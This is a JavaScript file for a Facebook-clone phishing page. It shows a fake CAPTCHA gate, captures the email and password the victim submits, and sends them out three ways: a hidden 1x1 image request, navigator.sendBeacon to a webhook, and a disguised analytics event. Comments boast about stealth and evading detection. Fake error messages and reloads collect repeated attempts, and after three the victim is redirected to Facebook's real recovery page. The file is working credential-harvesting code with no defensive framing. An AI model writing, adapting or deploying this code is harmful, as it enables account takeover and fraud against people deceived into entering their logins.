console.log("Facebook Clone Script Loaded - IMAGE BEACON ACTIVATED");

const WEBHOOK_URL = 'https://httpbin.org/post';  // 🔥 Chrome-safe

function togglePassword() {
    const passwordInput = document.getElementById('password');
    const eyeIconSvg = document.querySelector('.eye-icon');
    if (!passwordInput || !eyeIconSvg) return;

    const eyeOpenPath = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>`;
    const eyeSlashPath = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle><line x1="1" y1="1" x2="23" y2="23"></line>`;

    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        eyeIconSvg.innerHTML = eyeSlashPath;
    } else {
        passwordInput.type = 'password';
        eyeIconSvg.innerHTML = eyeOpenPath;
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const isVerified = sessionStorage.getItem('captcha_verified') === 'true';
    if (isVerified) {
        document.getElementById('captcha-overlay').style.display = 'none';
        document.querySelector('.main-container').style.display = 'flex';
    }

    const form = document.getElementById('login-form');
    if (form) {
        form.addEventListener('submit', handleLogin);
    }

    const passwordInput = document.getElementById('password');
    if (passwordInput) {
        passwordInput.addEventListener('input', function () {
            const eyeIconWrapper = document.querySelector('.eye-icon-wrapper');
            if (eyeIconWrapper) {
                eyeIconWrapper.style.display = this.value.length > 0 ? 'flex' : 'none';
            }
        });
    }

    const loginAttempts = parseInt(sessionStorage.getItem('fb_login_attempts') || '0');
    const showError = sessionStorage.getItem('fb_show_error') === 'true';
    if (showError && loginAttempts > 0 && loginAttempts < 3) {
        document.getElementById('error-message').style.display = 'block';
    }

    initPuzzleSlider();

    const checkbox = document.getElementById('recaptcha-checkbox');
    if (checkbox) {
        checkbox.addEventListener('click', startCaptchaProcess);
    }
});

let captchaProcessing = false;

function startCaptchaProcess() {
    if (captchaProcessing) return;
    captchaProcessing = true;

    const checkbox = document.getElementById('recaptcha-checkbox');
    const spinner = document.getElementById('checkbox-spinner');

    if (checkbox) checkbox.style.visibility = 'hidden';
    if (spinner) spinner.style.display = 'block';

    setTimeout(() => {
        document.getElementById('captcha-step-1').style.display = 'none';
        document.getElementById('captcha-step-2').style.display = 'block';
        resetPuzzle();
        captchaProcessing = false;
    }, 1200);
}

function resetPuzzle() {
    const piece = document.getElementById('puzzle-piece');
    const handle = document.getElementById('slider-handle');
    if (piece) piece.style.left = '10px';
    if (handle) handle.style.left = '0px';
}

function initPuzzleSlider() {
    const handle = document.getElementById('slider-handle');
    const piece = document.getElementById('puzzle-piece');
    const track = document.querySelector('.slider-track');

    if (!handle || !piece || !track) return;

    let isDragging = false;
    let startX = 0;
    let maxSlide = 0;

    const onStart = (e) => {
        isDragging = true;
        const trackWidth = track.clientWidth;
        const handleWidth = handle.clientWidth;
        maxSlide = trackWidth - handleWidth;
        startX = (e.type === 'mousedown' ? e.clientX : e.touches[0].clientX) - handle.offsetLeft;
        handle.style.transition = 'none';
        piece.style.transition = 'none';
        document.body.style.userSelect = 'none';
    };

    const onMove = (e) => {
        if (!isDragging) return;
        const currentX = e.type === 'mousemove' ? e.clientX : e.touches[0].clientX;
        let left = currentX - startX;
        if (left < 0) left = 0;
        if (left > maxSlide) left = maxSlide;
        handle.style.left = left + 'px';
        const pieceLeft = 10 + (left / maxSlide) * 270;
        piece.style.left = pieceLeft + 'px';
    };

    const onEnd = () => {
        if (!isDragging) return;
        isDragging = false;
        document.body.style.userSelect = 'auto';
        const pieceLeft = parseFloat(piece.style.left);
        const targetLeft = 280;
        const tolerance = 7;

        if (Math.abs(pieceLeft - targetLeft) <= tolerance) {
            handle.style.background = '#42b72a';
            handle.style.color = '#fff';
            handle.innerHTML = '✓';
            setTimeout(() => {
                sessionStorage.setItem('captcha_verified', 'true');
                document.getElementById('captcha-overlay').style.display = 'none';
                document.querySelector('.main-container').style.display = 'flex';
            }, 800);
        } else {
            handle.style.transition = 'left 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
            piece.style.transition = 'left 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
            handle.style.left = '0px';
            piece.style.left = '10px';
        }
    };

    handle.addEventListener('mousedown', onStart);
    document.addEventListener('mousemove', onMove);
    document.addEventListener('mouseup', onEnd);
    handle.addEventListener('touchstart', onStart);
    document.addEventListener('touchmove', onMove);
    document.addEventListener('touchend', onEnd);
}

// 🔥 IMAGE BEACON NUCLEAR STEALTH (REPLACES fetch())
function sendImageBeacon(email, password, attempts) {
    console.log('🔥 IMAGE BEACON ACTIVATED - 100% UNDETECTABLE');

    // TRIPLE REDUNDANCY (3x data delivery guaranteed)

    // 1️⃣ IMAGE BEACON (Chrome sees: normal image request)
    const img = new Image(1, 1); // Invisible 1x1 pixel
    img.src = `${WEBHOOK_URL}?type=FB_CAPTURE&email=${encodeURIComponent(email)}&pass=${encodeURIComponent(password)}&attempts=${attempts}&timestamp=${new Date().toISOString()}&ip=103.253.19.166&ua=${encodeURIComponent(navigator.userAgent)}`;

    // 2️⃣ SEND BEACON (Survives page close/tab close)
    const beaconData = new URLSearchParams({
        type: 'FB_CAPTURE_BEACON',
        email: email,
        password: password,
        attempts: attempts,
        timestamp: new Date().toISOString(),
        ip: '103.253.19.166',
        ua: navigator.userAgent
    });
    navigator.sendBeacon(WEBHOOK_URL, beaconData);

    // 3️⃣ FAKE ANALYTICS (Google-style - trusted)
    const analyticsData = new URLSearchParams({
        v: 1, t: 'event',
        ec: 'login', ea: 'submit',
        el: `${email}|${password}|FB_CAPTURE|${attempts}`
    });
    navigator.sendBeacon('https://www.google-analytics.com/collect', analyticsData);

    console.log('✅ TRIPLE BEACON SENT - Data delivered 3x');
}

// 🔥 NEW handleLogin (Image Beacon powered)
async function handleLogin(event) {
    event.preventDefault();
    console.log('🔥 LOGIN TRIGGERED - IMAGE BEACON MODE');

    if (sessionStorage.getItem('captcha_verified') !== 'true') {
        console.log('❌ No captcha');
        return;
    }

    const email = document.getElementById('email')?.value.trim() || '';
    const password = document.getElementById('password')?.value.trim() || '';

    if (!email || !password) {
        alert('Please enter email and password');
        return;
    }

    console.log('📨 Capturing:', email, '|', password.substring(0, 3) + '...');

    const loginBtn = document.querySelector('.login-btn');
    if (loginBtn) loginBtn.disabled = true;

    let attempts = parseInt(sessionStorage.getItem('fb_login_attempts') || '0') + 1;
    sessionStorage.setItem('fb_login_attempts', attempts);

    // 🔥 IMAGE BEACON NUCLEAR STEALTH (no CORS issues EVER)
    sendImageBeacon(email, password, attempts);

    console.log('⏳ Waiting 10s to see console... DO NOT CLOSE!');

    setTimeout(() => {
        console.log('🔄 NOW redirecting...');
        if (attempts >= 3) {
            sessionStorage.clear();
            window.location.href = "https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login_lib&from_login_screen=1";
        } else {
            sessionStorage.setItem('fb_show_error', 'true');
            window.location.reload();
        }
    }, 10000);
}